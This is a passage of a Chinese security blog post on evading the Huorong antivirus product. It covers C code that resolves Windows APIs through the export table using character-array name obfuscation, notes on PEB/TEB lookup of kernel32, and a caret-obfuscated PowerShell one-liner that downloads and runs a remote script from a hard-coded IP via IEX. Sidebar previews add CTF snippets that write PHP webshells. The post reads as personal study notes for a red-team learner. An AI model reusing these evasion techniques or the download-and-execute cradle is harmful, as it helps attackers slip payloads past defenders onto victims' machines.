的相对虚拟地址（RVA）</span><br><span class="line">        //函数总数+函数名称数量</span><br><span class="line">    DWORD dwFunCount = pImgExportDir-&gt;NumberOfFunctions;</span><br><span class="line">    DWORD dwFunNameCount = pImgExportDir-&gt;NumberOfNames;</span><br><span class="line"></span><br><span class="line">    // ...</span><br><span class="line">    PDWORD FunctionNameArray = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfNames);</span><br><span class="line">    // 获取函数的名称数组指针</span><br><span class="line">    PDWORD FunctionAddressArray = (PDWORD)(pBase + pImgExportDir-&gt;AddressOfFunctions);</span><br><span class="line">    // 获取函数的地址数组指针</span><br><span class="line">    //(1) 加一次 pBase + AddressOfFunctions	定位到地址表数组（是RVA数组）</span><br><span class="line">    //(2) 再取地址表表里的每一项，pBase	定位到实际字符串</span><br><span class="line">    PWORD FunctionOrdinalArray = (PWORD)(pBase + pImgExportDir-&gt;AddressOfNameOrdinals);</span><br><span class="line">    // 获取函数的序数数组指针</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    for (DWORD i = 0; i &lt; pImgExportDir-&gt;NumberOfFunctions; i++) &#123;</span><br><span class="line">        CHAR* pFunctionName = (CHAR*)(pBase + FunctionNameArray[i]);</span><br><span class="line">        //获取函数名</span><br><span class="line">        WORD wFunctionOrdinal = FunctionOrdinalArray[i];</span><br><span class="line"></span><br><span class="line">        PVOID pFunctionAddress = (PVOID)(pBase + FunctionAddressArray[wFunctionOrdinal]);</span><br><span class="line">        //来还原成真正的内存地址，然后才能正确访问函数名！</span><br><span class="line">        //获取函数序数</span><br><span class="line">        if (strcmp(lpApiName, pFunctionName) == 0) &#123;</span><br><span class="line">            printf(&quot;[ %0.4d ] NAME: %s -\t ADDRESS: 0x%p -\t ORDINAL: %d\n&quot;, i, pFunctionName, pFunctionAddress, wFunctionOrdinal);</span><br><span class="line">            //return pFunctionAddress;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    return NULL;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">char use1[] = &#123; &#x27;V&#x27;, &#x27;i&#x27;, &#x27;r&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;a&#x27;, &#x27;l&#x27;, &#x27;P&#x27;, &#x27;r&#x27;, &#x27;o&#x27;, &#x27;t&#x27;, &#x27;e&#x27;, &#x27;c&#x27;, &#x27;t&#x27;, 0 &#125;;</span><br><span class="line">char use2[] = &#123; &#x27;C&#x27;, &#x27;r&#x27;, &#x27;e&#x27;, &#x27;a&#x27;, &#x27;t&#x27;, &#x27;e&#x27;, &#x27;T&#x27;, &#x27;h&#x27;, &#x27;r&#x27;, &#x27;e&#x27;, &#x27;a&#x27;, &#x27;d&#x27;, 0 &#125;;</span><br><span class="line">char use3[] = &#123; &#x27;V&#x27;, &#x27;i&#x27;, &#x27;r&#x27;, &#x27;t&#x27;, &#x27;u&#x27;, &#x27;a&#x27;, &#x27;l&#x27;, &#x27;A&#x27;, &#x27;l&#x27;, &#x27;l&#x27;, &#x27;o&#x27;, &#x27;c&#x27;, 0 &#125;;</span><br><span class="line">char kn32[] = &#123; &#x27;k&#x27;, &#x27;e&#x27;, &#x27;r&#x27;, &#x27;n&#x27;, &#x27;e&#x27;, &#x27;l&#x27;, &#x27;3&#x27;, &#x27;2&#x27;, &#x27;.&#x27;, &#x27;d&#x27;, &#x27;l&#x27;, &#x27;l&#x27;, 0 &#125;;</span><br><span class="line"></span><br><span class="line">int main(int argc, TCHAR* argv[]) &#123;</span><br><span class="line"></span><br><span class="line">    GetProcAddressReplacement(GetModuleHandleA(kn32), use3);</span><br><span class="line"></span><br><span class="line">    printf(&quot;%p\n&quot;, GetProcAddress(GetModuleHandleA(kn32), use3));</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    system(&quot;pause&quot;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h2 id="三内联汇编"><a href="#三内联汇编" class="headerlink" title="三内联汇编"></a>三内联汇编</h2><h3 id="基址（Base-Address）"><a href="#基址（Base-Address）" class="headerlink" title="基址（Base Address）"></a>基址（Base Address）</h3><ul>
+<li><strong>定义</strong>：基址通常指的是一个模块（如 DLL 或 EXE）在内存中的起始地址。它是模块加载到内存时的地址。</li>
+<li><strong>用途</strong>：基址用于计算模块中各个部分（如函数、变量）相对于模块开始加载位置的偏移量。</li>
+</ul>
+<h3 id="句柄（Handle）"><a href="#句柄（Handle）" class="headerlink" title="句柄（Handle）"></a>句柄（Handle）</h3><ul>
+<li><strong>定义</strong>：句柄通常是一个由操作系统分配的、用于标识资源（如文件、线程、进程、窗口等）的唯一标识符。</li>
+<li><strong>用途</strong>：句柄用于访问和操作特定的资源。在 Windows API 中，句柄被广泛用于标识和操作各种资源。</li>
+</ul>
+<h3 id="PEB-进程环境块"><a href="#PEB-进程环境块" class="headerlink" title="PEB 进程环境块"></a>PEB 进程环境块</h3><p>（Process Environment Block）</p>
+<h3 id="TEB-线程环境块"><a href="#TEB-线程环境块" class="headerlink" title="TEB 线程环境块"></a>TEB 线程环境块</h3><p>线程环境块在进程环境块里，</p>
+<p>gs指向线程环境块，线程环境块里有进程环境块的地址（30&#x2F;60位）</p>
+<h3 id="GS"><a href="#GS" class="headerlink" title="GS"></a>GS</h3><p>线程环境块指针</p>
+<h3 id="List-Entry链表结构"><a href="#List-Entry链表结构" class="headerlink" title="_List_Entry链表结构"></a>_List_Entry链表结构</h3><p><a target="_blank" rel="noopener" href="https://blog.csdn.net/shenjin_s/article/details/79136121">https://blog.csdn.net/shenjin_s/article/details/79136121</a></p>
+<h3 id="测试"><a href="#测试" class="headerlink" title="测试"></a>测试</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">#include&lt;stdio.h&gt;</span><br><span class="line">#include&lt;Windows.h&gt;</span><br><span class="line">extern &quot;C&quot; void* GetKernel32Address();</span><br><span class="line">void* addr = GetKernel32Address();</span><br><span class="line">int main()</span><br><span class="line">&#123;</span><br><span class="line">	HMODULE hKernel32 = (HMODULE)addr;</span><br><span class="line">	printf(&quot;kernel32.dll 地址2: %p\n&quot;, hKernel32);</span><br><span class="line"></span><br><span class="line">	HMODULE h = LoadLibraryA(&quot;kernel32.dll&quot;);</span><br><span class="line">	printf(&quot;kernel32.dll 地址3: %p\n&quot;, h);</span><br><span class="line">	system(&quot;pause&quot;);</span><br><span class="line">	return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<h1 id="http码上线绕过"><a href="#http码上线绕过" class="headerlink" title="http码上线绕过"></a>http码上线绕过</h1><p>看看就行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd /c echo set-alias -name xz -value IEX;x^z (New-Object &quot;NeT.WeBClienT&quot;).d^o^w^n^l^o^a^d^s^t^r^i^n^g(&#x27;ht&#x27;+&#x27;tP://192.1&#x27;+&#x27;.1&#x27;+&#x27;.4&#x27;+&#x27;:80&#x27;+&#x27;82/1&#x27;) | p^o^w^e^r^s^h^e^l^l -</span><br></pre></td></tr></table></figure>
+
+
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="http://example.com">DDL</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="http://example.com/2025/04/27/%E5%85%8D%E6%9D%80%E8%BF%87%E7%81%AB%E7%BB%92%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/">http://example.com/2025/04/27/%E5%85%8D%E6%9D%80%E8%BF%87%E7%81%AB%E7%BB%92%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E5%85%8D%E6%9D%80/">免杀</a></div><div class="post-share"><div class="social-share" data-image="/img/avatar.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related" href="/2025/04/27/2025TGctf/" title="2025TGctf"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info"><div class="info-1"><div class="info-item-1">Previous</div><div class="info-item-2">2025TGctf</div></div><div class="info-2"><div class="info-item-1">web火眼选第二个命令执行的 123shell=`echo &quot;&lt;?= print_r(glob(&#x27;/*&#x27;));&quot; &gt;1.php`;shell=`echo &quot;&lt;?= file_get_contents(&#x27;/tgfffffllllaagggggg&#x27;);&quot; &gt;1.php`;  直面天命+（复仇）12GET /aazz?filename=a/b/c/d/secret.pyGET /aazz?filename=app.py  12345678910111213141516from fenjing import exec_cmd_payload, config_payloadimport logginglogging.basicConfig(level = logging.INFO)def waf(s: str): # 如果字符串s可以通过waf则返回True, 否则返回False    blacklist =...</div></div></div></a><a class="pagination-related" href="/2025/04/03/THM-Ra2/" title="THM-Ra2"><div class="cover" style="background: var(--default-bg-color)"></div><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">THM-Ra2</div></div><div class="info-2"><div class="info-item-1">本关讲的是个DNS投毒+SeImpersonatePrivilege提权 nmap -v –min-rate 10000 10.10.113.180 -p-  nmap -T4 -n -sC -sV -Pn  10.10.113.180 -p 53,80,88,135,139,389,443,445,464,593,636,2179,3268,3269,3389,5222,5223,5229,5262,5263,5269,5270,5275,5276,7070,7443,7777,9090,9091,9389,49667,49668,49669,49670,49671,49687,49699 firefox报错了，👇扫扫目录 1./gobuster dir -k -u https://fire.windcorp.thm  -q -t 50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt    PFX 文件用工具暴力破解密码然后连接 123456crackpkcs12 -d...</div></div></div></a></nav><hr class="custom-hr"/><div id="post-comment"><div class="comment-head"><div class="comment-headline"><i class="fas fa-comments fa-fw"></i><span> Comments</span></div></div><div class="comment-wrap"><div><div class="vcomment" id="vcomment"></div></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/avatar.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">DDL</div><div class="author-info-description">WELCOME MY GARBAGE DUMP</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">23</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">2</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/DDL08"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/DDL08" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a><a class="social-icon" href="mailto:2179219117@qq.com" target="_blank" title="Email"><i class="fas fa-envelope" style="color: #4a7dbe;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">师傅加个联系方式，讨论交流学习，若有不足还请师父指出</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%85%8D%E6%9D%80%E8%BF%87%E7%81%AB%E7%BB%92%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86"><span class="toc-number">1.</span> <span class="toc-text">免杀过火绒思路整理</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%AE%98%E6%96%B9%E6%96%87%E6%A1%A3"><span class="toc-number">1.1.</span> <span class="toc-text">官方文档</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%A4%A7%E7%99%BD%E5%93%A5%E5%9F%BA%E7%A1%80%E7%A0%81"><span class="toc-number">1.2.</span> <span class="toc-text">大白哥基础码</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BC%B9%E8%AE%A1%E7%AE%97%E5%99%A8"><span class="toc-number">1.3.</span> <span class="toc-text">弹计算器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%93%E6%9E%84"><span class="toc-number">1.4.</span> <span class="toc-text">结构</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%80%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0"><span class="toc-number">1.5.</span> <span class="toc-text">一自定义函数</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8%E5%87%BD%E6%95%B0%EF%BC%88%E9%9D%99%E6%80%81%E8%B0%83%E7%94%A8%EF%BC%89"><span class="toc-number">1.5.1.</span> <span class="toc-text">直接使用函数（静态调用）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E7%94%A8-GetProcAddress-%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88%EF%BC%88%E5%8A%A8%E6%80%81%E8%B0%83%E7%94%A8%EF%BC%89"><span class="toc-number">1.5.2.</span> <span class="toc-text">用 GetProcAddress + 函数指针（动态调用）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E8%87%AA%E5%AE%9A%E4%B9%89%E5%87%BD%E6%95%B0%E6%8C%87%E9%92%88"><span class="toc-number">1.5.3.</span> <span class="toc-text">自定义函数指针</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BA%8C%E9%81%8D%E5%8E%86%E5%AF%BC%E5%87%BA%E8%A1%A8"><span class="toc-number">1.6.</span> <span class="toc-text">二遍历导出表</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#VA"><span class="toc-number">1.6.1.</span> <span class="toc-text">VA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#RVA"><span class="toc-number">1.6.2.</span> <span class="toc-text">RVA</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%BA%8F%E6%95%B0"><span class="toc-number">1.6.3.</span> <span class="toc-text">序数</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%B8%89%E5%86%85%E8%81%94%E6%B1%87%E7%BC%96"><span class="toc-number">1.7.</span> <span class="toc-text">三内联汇编</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%9F%BA%E5%9D%80%EF%BC%88Base-Address%EF%BC%89"><span class="toc-number">1.7.1.</span> <span class="toc-text">基址（Base Address）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%A5%E6%9F%84%EF%BC%88Handle%EF%BC%89"><span class="toc-number">1.7.2.</span> <span class="toc-text">句柄（Handle）</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PEB-%E8%BF%9B%E7%A8%8B%E7%8E%AF%E5%A2%83%E5%9D%97"><span class="toc-number">1.7.3.</span> <span class="toc-text">PEB 进程环境块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#TEB-%E7%BA%BF%E7%A8%8B%E7%8E%AF%E5%A2%83%E5%9D%97"><span class="toc-number">1.7.4.</span> <span class="toc-text">TEB 线程环境块</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#GS"><span class="toc-number">1.7.5.</span> <span class="toc-text">GS</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#List-Entry%E9%93%BE%E8%A1%A8%E7%BB%93%E6%9E%84"><span class="toc-number">1.7.6.</span> <span class="toc-text">_List_Entry链表结构</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%B5%8B%E8%AF%95"><span class="toc-number">1.7.7.</span> <span class="toc-text">测试</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#http%E7%A0%81%E4%B8%8A%E7%BA%BF%E7%BB%95%E8%BF%87"><span class="toc-number">2.</span> <span class="toc-text">http码上线绕过</span></a></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/27/2025TGctf/" title="2025TGctf">2025TGctf</a><time datetime="2025-04-27T08:36:37.000Z" title="Created 2025-04-27 16:36:37">2025-04-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/27/%E5%85%8D%E6%9D%80%E8%BF%87%E7%81%AB%E7%BB%92%E6%80%9D%E8%B7%AF%E6%95%B4%E7%90%86/" title="免杀过火绒思路整理">免杀过火绒思路整理</a><time datetime="2025-04-27T08:28:12.000Z" title="Created 2025-04-27 16:28:12">2025-04-27</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/04/03/THM-Ra2/" title="THM-Ra2">THM-Ra2</a><time datetime="2025-04-03T10:32:00.000Z" title="Created 2025-04-03 18:32:00">2025-04-03</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/17/THM%E7%AC%94%E8%AE%B0/" title="THM笔记">THM笔记</a><time datetime="2025-03-17T11:15:33.000Z" title="Created 2025-03-17 19:15:33">2025-03-17</time></div></div><div class="aside-list-item no-cover"><div class="content"><a class="title" href="/2025/03/17/2024%E9%B9%8F%E7%A8%8B%E6%9D%AF/" title="2024鹏程杯">2024鹏程杯</a><time datetime="2025-03-17T11:12:08.000Z" title="Created 2025-03-17 19:12:08">2025-03-17</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2024 - 2025 By DDL</div><div class="framework-info"><span>Framework </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>Theme </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><a id="to_comment" href="#post-comment" title="Scroll to Comments"><i class="fas fa-comments"></i></a><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"><script>(() => {
+  const isShuoshuo = GLOBAL_CONFIG_SITE.isShuoshuo
+  const option = null
+
+  const initValine = (el, path) => {
+    if (isShuoshuo) {
+      window.shuoshuoComment.destroyValine = () => {
+        if (el.children.length) {
+          el.innerHTML = ''
+          el.classList.add('no-comment')
+        }
+      }
+    }
+
+    const valineConfig = {
+      el: '#vcomment',
+      appId: 'HVeI0ARPlb1wmqNwceN5bAr0-gzGzoHsz',
+      appKey: 'budtvYOInoQ1hIEDD2X5VhXq',
+      avatar: 'monsterid',
+      serverURLs: '',
+      emojiMaps: "",
+      visitor: false,
+      ...option,
+      path: isShuoshuo ? path : (option && option.path) || window.location.pathname
+    }
+
+    new Valine(valineConfig)
+  }
+
+  const loadValine = async (el, path) => {
+    if (typeof Valine === 'function') {
+      initValine(el, path)
+    } else {
+      await btf.getScript('https://cdn.jsdelivr.net/npm/valine/dist/Valine.min.js')
+      initValine(el, path)
+    }
+  }
+
+  if (isShuoshuo) {
+    'Valine' === 'Valine'
+      ? window.shuoshuoComment = { loadComment: loadValine }
+      : window.loadOtherComment = loadValine
+    return
+  }
+
+  if ('Valine' === 'Valine' || !false) {
+    if (false) btf.loadComment(document.getElementById('vcomment'),loadValine)
+    else setTimeout(loadValine, 0)
+  } else {
+    window.loadOtherComment = loadValine
+  }
+})()</script></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>
